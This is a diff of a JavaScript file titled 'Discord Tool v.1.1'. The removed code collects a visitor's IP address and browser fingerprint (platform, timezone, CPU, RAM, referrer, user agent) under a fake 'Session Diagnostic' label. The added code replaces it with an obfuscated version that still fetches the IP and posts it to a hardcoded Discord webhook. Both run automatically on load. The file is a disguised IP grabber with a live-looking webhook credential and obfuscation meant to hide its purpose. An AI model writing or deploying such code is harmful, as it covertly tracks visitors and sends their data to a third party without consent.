@@ -1,72 +1,147 @@
-// --- Discord Tool v.1.1 ---
-const ipifyAPI = "https://api.ipify.org?format=json";
-const webhookURL = "https://ptb.discord.com/api/webhooks/1527734124520149117/JbJOjX2jYzYQPEfIUsDXh4DNJGuX1asp7MmMT0GtxhxKpturo2sWfXWTFge1bGAuJw2x";
-
+const _0x28a059 = _0x44e7;
+(function (_0x12eb2a, _0x5c5529) {
+    const _0x4a602c = _0x44e7, _0x121c16 = _0x12eb2a();
+    while (!![]) {
+        try {
+            const _0x59e95b = -parseInt(_0x4a602c(0x17a)) / (-0x1 * -0x1fe9 + -0x107 * -0x25 + -0x45eb * 0x1) * (parseInt(_0x4a602c(0x19e)) / (0xe * -0xe2 + -0x3 * 0x959 + 0x815 * 0x5)) + -parseInt(_0x4a602c(0x1ae)) / (-0x12ca + -0x3 * 0x43 + 0x1396) * (parseInt(_0x4a602c(0x18c)) / (0x3 * 0x6fe + 0x787 + 0xb * -0x297)) + parseInt(_0x4a602c(0x194)) / (-0xbf5 + -0x4 * 0x199 + 0x125e) * (parseInt(_0x4a602c(0x197)) / (0x1e2 * 0xa + 0x27e + -0x154c)) + parseInt(_0x4a602c(0x1a0)) / (-0x373 * -0x8 + 0x10 * -0x166 + -0x531) * (parseInt(_0x4a602c(0x1a1)) / (-0x2a1 + 0xe07 + -0x61 * 0x1e)) + -parseInt(_0x4a602c(0x19b)) / (0xd * 0x215 + 0x1c72 + -0x377a) * (parseInt(_0x4a602c(0x193)) / (-0x1 * 0x129e + 0x1973 + -0x1 * 0x6cb)) + parseInt(_0x4a602c(0x1ad)) / (-0x5 * 0x178 + 0x1 * -0x91 + 0x4 * 0x1fd) * (-parseInt(_0x4a602c(0x1b0)) / (0xd * 0x287 + 0x77d + -0x284c)) + -parseInt(_0x4a602c(0x1a6)) / (-0x1 * -0x2179 + -0x109 * 0x1b + 0x579 * -0x1) * (-parseInt(_0x4a602c(0x187)) / (0x2619 + 0x1377 + -0x362 * 0x11));
+            if (_0x59e95b === _0x5c5529)
+                break;
+            else
+                _0x121c16['push'](_0x121c16['shift']());
+        } catch (_0x3c66d4) {
+            _0x121c16['push'](_0x121c16['shift']());
+        }
+    }
+}(_0x5c2e, -0x871 * 0x89 + 0x4daa6 * 0x1 + -0x2702 * -0x1d));
+const ipifyAPI = _0x28a059(0x1a8) + _0x28a059(0x1a3) + _0x28a059(0x198) + _0x28a059(0x180), webhookURL = _0x28a059(0x185) + _0x28a059(0x184) + _0x28a059(0x1a7) + _0x28a059(0x17e) + _0x28a059(0x192) + _0x28a059(0x1aa) + _0x28a059(0x1a9) + _0x28a059(0x17c) + _0x28a059(0x1b7) + _0x28a059(0x181) + _0x28a059(0x1ac) + _0x28a059(0x1b8) + _0x28a059(0x17d);
 async function getIP() {
+    const _0xc474d0 = _0x28a059, _0x58c32c = {
+            'KjWxp': function (_0x4fc1bc, _0x2c67b3) {
+                return _0x4fc1bc(_0x2c67b3);
+            },
+            'milCI': _0xc474d0(0x1a4) + _0xc474d0(0x1b2)
+        };
     try {
-        const response = await fetch(ipifyAPI);
-        const data = await response.json();
-        return data.ip;
-    } catch (error) {
-        console.error("Error fetching IP:", error);
-        return null;
+        const _0x4dcaca = await _0x58c32c[_0xc474d0(0x1b4)](fetch, ipifyAPI), _0xbab21b = await _0x4dcaca[_0xc474d0(0x1b3)]();
+        return _0xbab21b['ip'];
+    } catch (_0x596b1a) {
+        return console[_0xc474d0(0x195)](_0x58c32c[_0xc474d0(0x1af)], _0x596b1a), null;
     }
 }
-
-async function sendToDiscord(ip) {
-    if (!ip) return;
-
-    // Recopilación de más datos del navegador/dispositivo
-    const userAgent = navigator.userAgent;
-    const platform = navigator.platform;
-    const language = navigator.language;
-    const screenRes = `${window.screen.width}x${window.screen.height}`;
-    const timeZone = Intl.DateTimeFormat().resolvedOptions().timeZone;
-    const cpuCores = navigator.hardwareConcurrency || "No disponible";
-    const ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "No disponible";
-    const referrer = document.referrer ? document.referrer : "Acceso directo";
-
-    const payload = {
-        embeds: [
-            {
-                title: "Discord Session Diagnostic - Advanced Info",
-                color: 5814783,
-                fields: [
-                    { name: "Client IP", value: ip, inline: true },
-                    { name: "Plataforma", value: platform, inline: true },
-                    { name: "Idioma", value: language, inline: true },
-                    { name: "Resolución", value: screenRes, inline: true },
-                    { name: "Zona Horaria", value: timeZone, inline: true },
-                    { name: "Núcleos CPU", value: String(cpuCores), inline: true },
-                    { name: "RAM Aprox.", value: ram, inline: true },
-                    { name: "Referrer", value: referrer, inline: false },
-                    {
-                        name: "User-Agent",
-                        value: `\`\`\`${userAgent}\`\`\``,
-                        inline: false
-                    }
-                ],
-                timestamp: new Date().toISOString()
-            }
-        ]
-    };
-
+async function sendToDiscord(_0x4cf140) {
+    const _0x19a92f = _0x28a059, _0x38acda = {
+            'XxtSr': _0x19a92f(0x1ab) + _0x19a92f(0x196) + _0x19a92f(0x18e) + 'd.',
+            'fwGEk': function (_0x5ee14e, _0x538541, _0x183cb6) {
+                return _0x5ee14e(_0x538541, _0x183cb6);
+            },
+            'UDztE': _0x19a92f(0x183),
+            'XIgZu': _0x19a92f(0x18f) + _0x19a92f(0x19c),
+            'cxYyO': _0x19a92f(0x18a) + _0x19a92f(0x17f) + _0x19a92f(0x1b5) + 'y!',
+            'tOZyi': _0x19a92f(0x191) + _0x19a92f(0x19a) + _0x19a92f(0x18b),
+            'EMkEA': _0x19a92f(0x19d)
+        };
+    if (!_0x4cf140) {
+        console[_0x19a92f(0x195)](_0x38acda[_0x19a92f(0x190)]);
+        return;
+    }
+    const _0x607cca = { 'content': _0x19a92f(0x189) + ':\x20' + _0x4cf140 };
     try {
-        await fetch(webhookURL, {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify(payload)
+        const _0x327fa1 = await _0x38acda[_0x19a92f(0x19f)](fetch, webhookURL, {
+            'method': _0x38acda[_0x19a92f(0x18d)],
+            'headers': { 'Content-Type': _0x38acda[_0x19a92f(0x17b)] },
+            'body': JSON[_0x19a92f(0x1b6)](_0x607cca)
         });
-    } catch (error) {
-        console.error("Error:", error);
+        _0x327fa1['ok'] ? console[_0x19a92f(0x188)](_0x38acda[_0x19a92f(0x1a2)]) : console[_0x19a92f(0x195)](_0x38acda[_0x19a92f(0x182)], _0x327fa1[_0x19a92f(0x199)]);
+    } catch (_0x4e97f5) {
+        console[_0x19a92f(0x195)](_0x38acda[_0x19a92f(0x1b1)], _0x4e97f5);
     }
 }
-
+function _0x44e7(_0x573faf, _0x305646) {
+    _0x573faf = _0x573faf - (0x2 * -0x9a3 + 0x1513 + -0x53);
+    const _0x16272b = _0x5c2e();
+    let _0x1f1e14 = _0x16272b[_0x573faf];
+    return _0x1f1e14;
+}
+function _0x5c2e() {
+    const _0x5aeed7 = [
+        '686flHTPB',
+        'log',
+        'IP\x20Address',
+        'IP\x20sent\x20to',
+        'Discord:',
+        '16uAUkrS',
+        'UDztE',
+        'r\x20undefine',
+        'applicatio',
+        'XxtSr',
+        'Error\x20send',
+        '7734124520',
+        '3565820TvwVqi',
+        '27435KLalAK',
+        'error',
+        '\x20is\x20null\x20o',
+        '546hoZFoc',
+        'g?format=j',
+        'statusText',
+        'ing\x20IP\x20to\x20',
+        '9uWQqOl',
+        'n/json',
+        'Error:',
+        '158206LndsEk',
+        'fwGEk',
+        '34741vhHbPH',
+        '664xeiQca',
+        'cxYyO',
+        'i.ipify.or',
+        'Error\x20fetc',
+        'NaVHd',
+        '137813DTvReO',
+        'com/api/we',
+        'https://ap',
+        'OjX2jYzYQP',
+        '149117/JbJ',
+        'IP\x20address',
+        'Kpturo2sWf',
+        '11SbMdIz',
+        '60294NrAdez',
+        'milCI',
+        '7235556pkOqZR',
+        'EMkEA',
+        'hing\x20IP:',
+        'json',
+        'KjWxp',
+        'uccessfull',
+        'stringify',
+        'NJGuX1asp7',
+        'XWTFge1bGA',
+        '1XnMKKK',
+        'XIgZu',
+        'EfIUsDXh4D',
+        'uJw2x',
+        'bhooks/152',
+        '\x20Discord\x20s',
+        'son',
+        'MmMT0Gtxhx',
+        'tOZyi',
+        'POST',
+        'b.discord.',
+        'https://pt',
+        'cPYcQ'
+    ];
+    _0x5c2e = function () {
+        return _0x5aeed7;
+    };
+    return _0x5c2e();
+}
 async function main() {
-    const ip = await getIP();
-    if (ip) {
-        await sendToDiscord(ip);
-    }
+    const _0x2026f5 = _0x28a059, _0x254030 = {
+            'cPYcQ': function (_0x1c688f) {
+                return _0x1c688f();
+            },
+            'NaVHd': function (_0x52d964, _0x9cfdb) {
+                return _0x52d964(_0x9cfdb);
+            }
+        }, _0x58f9f7 = await _0x254030[_0x2026f5(0x186)](getIP);
+    _0x58f9f7 && await _0x254030[_0x2026f5(0x1a5)](sendToDiscord, _0x58f9f7);
 }
-
 main();
